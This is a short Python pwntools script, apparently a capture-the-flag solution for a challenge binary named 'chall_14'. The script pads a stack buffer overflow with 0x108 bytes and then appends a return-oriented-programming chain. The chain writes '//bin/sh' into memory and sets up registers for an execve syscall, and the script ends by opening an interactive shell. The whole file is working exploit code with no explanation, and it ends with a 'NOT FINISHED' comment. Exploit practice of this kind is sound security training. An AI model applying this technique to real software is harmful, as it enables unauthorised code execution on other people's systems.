from pwn import *
from struct import pack

binary = context.binary = ELF('./chall_14')

p = process(binary.path)

rebase_0 = lambda x : p64(x + binary.address)

rop = b''

rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000018ca) # 0x00000000004018ca: pop rdi; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f3fe) # 0x000000000040f3fe: pop rsi; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000017cf) # 0x00000000004017cf: pop rdx; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000494a7) # 0x00000000004494a7: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret;

payload  = 0x108 * b'A'
payload += rop

p.sendline()
p.sendline(payload)
p.interactive()
# NOT FINISHED
